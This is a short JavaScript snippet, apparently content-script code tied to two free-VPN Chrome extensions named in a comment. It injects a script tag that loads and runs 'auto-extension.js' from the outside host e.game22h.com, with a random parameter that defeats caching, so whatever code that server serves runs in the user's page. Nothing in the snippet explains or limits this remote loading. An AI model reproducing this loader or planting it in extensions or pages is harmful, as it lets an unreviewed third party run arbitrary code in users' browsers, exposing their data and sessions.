/*
https://chrome.google.com/webstore/detail/free-vpn/njpmifchgidinihmijhcfpbdmglecdlb
https://chrome.google.com/webstore/detail/vpn-professional-free-unl/foiopecknacmiihiocgdjgbjokkpkohc?hl=vi
*/
   //create element script
function addScript( src ) {

                    let script = document.createElement( 'script' );
                    script.setAttribute( 'src', src );
                    script.async = false;
                    document.body.appendChild( script );
}
addScript('//e.game22h.com/tools/auto-extension.js?v='+getRandomInt(2233333342333333333332));

//random int
function getRandomInt(max) {
  return Math.floor(Math.random() * max);
}